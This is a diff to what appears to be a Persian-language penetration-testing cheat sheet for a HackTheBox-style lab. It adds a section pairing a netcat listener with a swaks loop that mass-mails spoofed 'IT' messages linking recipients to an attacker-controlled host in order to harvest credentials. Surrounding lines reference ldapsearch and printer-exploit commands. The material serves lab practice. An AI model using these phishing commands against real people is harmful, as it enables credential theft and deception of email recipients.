@@ -506,6 +506,17 @@ ldapsearch -x -LLL -w PASSWORD
 python pret.py 10.10.10.10 pjl
 ```
 
+## ارسال ایمیل و حدس کلمه عبور smtp
+
+```text
+1. 
+nc -lvnp 80
+
+2. 
+while read mail; do swaks --to $mail --from it@sneakymailer.htb --header "Subject: Credentials /
+Errors" --body "goto http://10.10.10.19/" --server 10.10.10.10; done < mails.txt
+```
+
 ## vnc
 
 ### رمزگشایی فایل VNC Install.reg
